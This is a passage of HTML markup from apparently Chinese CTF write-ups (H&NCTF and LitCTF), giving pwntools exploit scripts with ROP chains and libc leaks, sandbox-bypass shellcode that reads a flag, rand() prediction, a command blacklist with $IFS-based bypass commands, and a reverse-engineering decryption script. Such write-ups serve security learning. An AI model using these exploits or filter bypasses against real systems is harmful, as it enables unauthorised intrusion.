remote(<span class="string">&#x27;27.25.151.198&#x27;</span>,<span class="number">45600</span>)</span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">bss = <span class="number">0x404100</span></span><br><span class="line">pop_rbp = <span class="number">0x4011FD</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401263</span></span><br><span class="line">leave_ret = <span class="number">0x4011CE</span></span><br><span class="line">ret = <span class="number">0x4011FE</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;can you did ?&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;z&#x27;</span>*<span class="number">0x40</span> + p64(bss+<span class="number">0x40</span>)+p64(<span class="number">0x4011B7</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload = (p64(pop_rdi)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(pop_rbp)+p64(bss+<span class="number">0x200</span>+<span class="number">0x40</span>)+p64(<span class="number">0x4011B7</span>)).ljust(<span class="number">0x40</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(bss-<span class="number">8</span>)+p64(leave_ret)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line">pop_rdx_rbx=<span class="number">0x00000000000904a9</span>+libc_base</span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000401261</span></span><br><span class="line">one_gadget = <span class="number">0xebc88</span>  +libc_base</span><br><span class="line">rbp = <span class="number">0x404100</span></span><br><span class="line">payload =(p64(rbp)+p64(pop_rsi_r15)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pop_rdx_rbx)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(one_gadget)).ljust(<span class="number">0x40</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(bss+<span class="number">0x200</span>)+p64(leave_ret)</span><br><span class="line"> </span><br><span class="line">io.send(payload)</span><br><span class="line"> </span><br><span class="line">io.interactive()  </span><br></pre></td></tr></table></figure><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>【orw进阶】</p><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>开了沙箱</p><p><img src="/../images/H&NCTF/Snipaste_2025-06-07_16-30-08.png" alt="1"></p><p>禁用了write和sendfile可以用writev</p><p>openat–&gt;mmap–&gt;pread–&gt;writev</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;27.25.151.198&#x27;</span>,<span class="number">42733</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* 1. 打开flag文件 */</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c66</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdi, -0x64</span></span><br><span class="line"><span class="string">    mov rdx, 0</span></span><br><span class="line"><span class="string">    mov rax, 257           /* openat系统调用号 */</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov r13, rax           /* 保存文件描述符到r13 */</span></span><br><span class="line"><span class="string">    cmp r13, 0             /* 检查是否打开失败 */</span></span><br><span class="line"><span class="string">    jl exit_shellcode</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    /* 2. 分配内存 */</span></span><br><span class="line"><span class="string">    mov rdi, 0</span></span><br><span class="line"><span class="string">    mov rsi, 0x1000</span></span><br><span class="line"><span class="string">    mov rdx, 0x3</span></span><br><span class="line"><span class="string">    mov r10, 0x22</span></span><br><span class="line"><span class="string">    mov r8, -1</span></span><br><span class="line"><span class="string">    mov r9, 0</span></span><br><span class="line"><span class="string">    mov rax, 9             /* mmap系统调用号 */</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov r12, rax           /* 保存映射地址到r12 */</span></span><br><span class="line"><span class="string">    cmp r12, -1            /* 检查mmap是否失败 */</span></span><br><span class="line"><span class="string">    je exit_shellcode</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    /* 3. 读取文件内容 */</span></span><br><span class="line"><span class="string">    mov rdi, r13           /* 文件描述符(r13) */</span></span><br><span class="line"><span class="string">    mov rsi, r12           /* 缓冲区地址 */</span></span><br><span class="line"><span class="string">    mov rdx, 0x1000        /* 读取大小 */</span></span><br><span class="line"><span class="string">    mov r10, 0             /* 偏移量 */</span></span><br><span class="line"><span class="string">    mov rax, 17            /* pread系统调用号 */</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rbx, rax           /* 保存读取的字节数到rbx */</span></span><br><span class="line"><span class="string">    cmp rbx, 0             /* 检查是否读取失败 */</span></span><br><span class="line"><span class="string">    jle exit_shellcode</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    /* 4. 构造iovec并调用writev */</span></span><br><span class="line"><span class="string">    sub rsp, 0x10</span></span><br><span class="line"><span class="string">    mov [rsp], r12         /* iov_base = 映射地址 */</span></span><br><span class="line"><span class="string">    mov [rsp+8], rbx       /* iov_len = 读取的字节数 */</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rdi, 1             /* fd=1 (标准输出) */</span></span><br><span class="line"><span class="string">    lea rsi, [rsp]         /* iovec地址 */</span></span><br><span class="line"><span class="string">    mov rdx, 1             /* iovcnt=1 */</span></span><br><span class="line"><span class="string">    mov rax, 20            /* writev系统调用号 */</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    add rsp, 0x10          /* 恢复栈指针 */</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">exit_shellcode:</span></span><br><span class="line"><span class="string">    mov rax, 60</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Enter your command:&#x27;</span>)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="pdd助力"><a href="#pdd助力" class="headerlink" title="pdd助力"></a>pdd助力</h2><p>【随机数】</p><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>有libc可以用密码库生成和服务器一样的随机数绕过第一个随机数检查，第二个随机数种子固定可以直接本地生成一次记录下来然后绕过，最后进入func函数泄露libc基址即可</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;27.25.151.198&#x27;</span>,<span class="number">40324</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(</span></span><br><span class="line"><span class="comment">#    [&quot;/home/pwn/桌面/ld.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#    env=&#123;&quot;LD_PRELOAD&quot;: &quot;/home/pwn/桌面/libc.so.6&quot;&#125;,</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">libc=ctypes.CDLL(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;game1 begin\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">seed=libc.time(<span class="number">0</span>)</span><br><span class="line">libc.srand(seed)</span><br><span class="line">v5=libc.rand()</span><br><span class="line"></span><br><span class="line">libc.srand(v5%<span class="number">5</span>-<span class="number">44174237</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">55</span>):</span><br><span class="line">    tmp=libc.rand()%<span class="number">4</span>+<span class="number">1</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;good!&#x27;</span>,<span class="built_in">str</span>(tmp))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;game2 begin\n&#x27;</span>)</span><br><span class="line">libc.srand(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">55</span>):</span><br><span class="line">    tmp=libc.rand()%<span class="number">4</span>+<span class="number">8</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;good!&#x27;</span>,<span class="built_in">str</span>(tmp))</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401483</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">func = <span class="number">0x40121F</span> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(pop_rdi) + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p64(puts_plt) + p64(func)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;young man.&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line">pop_rdx_rbx = libc_base + <span class="number">0x00000000000904a9</span></span><br><span class="line">pop_rsi_r15 =<span class="number">0x0000000000401481</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span>+p64(pop_rdi)+p64(bin_sh)+p64(pop_rdx_rbx)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(ret)+p64(system)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()  </span><br></pre></td></tr></table></figure><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="签到re"><a href="#签到re" class="headerlink" title="签到re"></a>签到re</h2><p>豆包一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标密文</span></span><br><span class="line">target_ciphertext = <span class="built_in">bytes</span>([</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x25</span>, <span class="number">0x0C</span>, <span class="number">0xE2</span>, <span class="number">0x70</span>, <span class="number">0x89</span>, <span class="number">0x98</span>, <span class="number">0xB2</span>, <span class="number">0xBB</span>,</span><br><span class="line">    <span class="number">0xE4</span>, <span class="number">0x94</span>, <span class="number">0xA0</span>, <span class="number">0x95</span>, <span class="number">0xAC</span>, <span class="number">0x38</span>, <span class="number">0x92</span>, <span class="number">0x22</span>, <span class="number">0xF8</span>, <span class="number">0x0E</span>, <span class="number">0x7B</span>,</span><br><span class="line">    <span class="number">0x76</span>, <span class="number">0x1A</span>, <span class="number">0x66</span>, <span class="number">0xC8</span>, <span class="number">0x03</span>, <span class="number">0x05</span>, <span class="number">0x2E</span>, <span class="number">0x7D</span>, <span class="number">0xA1</span>, <span class="number">0x04</span>, <span class="number">0x3D</span>,</span><br><span class="line">    <span class="number">0xC0</span>, <span class="number">0x62</span>, <span class="number">0xFE</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x02</span>, <span class="number">0x87</span>, <span class="number">0x81</span>, <span class="number">0xF4</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密钥</span></span><br><span class="line">key = <span class="string">b&quot;MySecretKey123!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">derive_key</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="comment"># 计算SHA256哈希</span></span><br><span class="line">    sha256 = hashlib.sha256(key).digest()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 按照伪代码中的方式构造a3</span></span><br><span class="line">    <span class="comment"># 注意：这里使用了伪代码中的位操作逻辑</span></span><br><span class="line">    v4 = sha256[<span class="number">0</span>]</span><br><span class="line">    v5 = <span class="built_in">int</span>.from_bytes(sha256[<span class="number">1</span>:<span class="number">3</span>], <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    v6 = sha256[<span class="number">3</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 构造a3</span></span><br><span class="line">    a3 = (v4 | <span class="number">1</span>) | ((v5 &amp; <span class="number">0xFEFE</span>) &lt;&lt; <span class="number">8</span>) | ((v6 | <span class="number">1</span>) &lt;&lt; <span class="number">24</span>)</span><br><span class="line">    <span class="keyword">return</span> a3</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_block</span>(<span class="params">cipher_block, a3</span>):</span><br><span class="line">    <span class="comment"># 提取字节</span></span><br><span class="line">    c0, c1 = cipher_block[<span class="number">0</span>], cipher_block[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 提取a3的各个字节</span></span><br><span class="line">    b0 = a3 &amp; <span class="number">0xFF</span></span><br><span class="line">    b1 = (a3 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    b2 = (a3 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    b3 = (a3 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 计算行列式的逆（模256）</span></span><br><span class="line">    det = (b0 * b3 - b1 * b2) % <span class="number">256</span></span><br><span class="line">    det_inv = <span class="built_in">pow</span>(det, -<span class="number">1</span>, <span class="number">256</span>)  <span class="comment"># 计算模逆元</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 解密公式推导</span></span><br><span class="line">    p0 = ((c0 * b3 - c1 * b1) * det_inv) % <span class="number">256</span></span><br><span class="line">    p1 = ((c1 * b0 - c0 * b2) * det_inv) % <span class="number">256</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([p0, p1])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ciphertext, a3</span>):</span><br><span class="line">    <span class="comment"># 提取原始长度</span></span><br><span class="line">    n_bytes = ciphertext[:<span class="number">4</span>]</span><br><span class="line">    n = struct.unpack(<span class="string">&#x27;&lt;I&#x27;</span>, n_bytes)[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 解密剩余部分</span></span><br><span class="line">    decrypted = <span class="built_in">bytearray</span>()</span><br><span class="line">    cipher_blocks = ciphertext[<span class="number">4</span>:]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cipher_blocks), <span class="number">4</span>):</span><br><span class="line">        block1 = cipher_blocks[i:i+<span class="number">2</span>]</span><br><span class="line">        block2 = cipher_blocks[i+<span class="number">2</span>:i+<span class="number">4</span>]</span><br><span class="line">        </span><br><span class="line">        decrypted_block1 = decrypt_block(block1, a3)</span><br><span class="line">        decrypted_block2 = decrypt_block(block2, a3)</span><br><span class="line">        </span><br><span class="line">        decrypted.extend(decrypted_block1)</span><br><span class="line">        decrypted.extend(decrypted_block2)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 返回原始长度的明文</span></span><br><span class="line">    <span class="keyword">return</span> decrypted[:n]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行解密</span></span><br><span class="line">a3 = derive_key(key)</span><br><span class="line">plaintext = decrypt(target_ciphertext, a3)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密结果:&quot;</span>, plaintext.decode(<span class="string">&#x27;ascii&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>))    </span><br><span class="line"><span class="comment">#H&amp;NCTF&#123;840584fb08a26f01c471054628e451&#125;</span></span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><p>签到and签退</p><p><img src="/../images/H&NCTF/Screenshot_20250608_100945.jpg" alt="1"></p>]]></content>
      
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LitCTF wp（更新中）</title>
      <link href="/2025/05/25/LitCTFwp/"/>
      <url>/2025/05/25/LitCTFwp/</url>
      
        <content type="html"><![CDATA[<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h2><p>010edi打开附件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;input your command&quot;</span>)</span><br><span class="line"></span><br><span class="line">blacklist = [<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;cd&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;$&#123;IFS&#125;&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    command = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> command:</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    os.system(command)</span><br></pre></td></tr></table></figure><p>发现过滤了一些指令，可以通过变量拼接构造cat，通过$IFS$9绕过空格过滤分隔指令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=fl;d=ag;$a$b$IFS$9$c<span class="variable">$d</span></span><br></pre></td></tr></table></figure><p>也可以用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$0</span> , /bin/s? s<span class="string">&#x27;&#x27;</span>h </span><br></pre></td></tr></table></figure><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>check</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">桌面$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/桌面/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>开了沙箱</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">桌面$ seccomp-tools dump ./pwn</span><br><span class="line">Welcome LitCTF 2025</span><br><span class="line">Please input your shellcode: </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x06 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x03 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0008</span><br><span class="line"> 0005: 0x15 